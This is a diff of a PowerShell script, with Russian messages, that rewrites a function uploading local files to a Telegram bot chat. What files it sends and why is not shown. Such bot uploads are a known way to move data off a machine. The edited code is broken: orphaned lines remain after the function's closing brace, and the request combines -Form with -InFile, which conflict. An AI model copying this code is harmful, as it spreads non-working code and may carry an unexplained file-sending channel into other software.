@@ -34,20 +34,32 @@ $OutputMessages = @{
 }
 
 function Send-TelegramFile {
-    param([string]$FilePath, [string]$Caption = "")
+    param(
+        [string]$FilePath,
+        [string]$Caption = ""
+    )
+
+    # Проверка корректности пути
     if ([string]::IsNullOrWhiteSpace($FilePath) -or -not (Test-Path $FilePath)) {
         Write-Host "Ошибка: пустой или некорректный путь к файлу! ($FilePath)" -ForegroundColor Red
         return
     }
+
     $Url = "https://api.telegram.org/bot$BotToken/sendDocument"
-    $FormData = @{
+    $Form = @{
         chat_id = $YourChatId
         caption = $Caption
     }
-    if ([string]::IsNullOrWhiteSpace($FilePath) -or -not (Test-Path $FilePath)) {
-    Write-Host "Ошибка: некорректный путь к файлу для отправки!" -ForegroundColor Red
-    return
+
+    try {
+        $Response = Invoke-RestMethod -Uri $Url -Method Post -Form $Form -InFile $FilePath -ContentType "multipart/form-data"
+        Write-Host "[+] Файл '$FilePath' отправлен успешно." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Ошибка отправки файла '$FilePath': $_" -ForegroundColor Red
+    }
 }
+
     $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
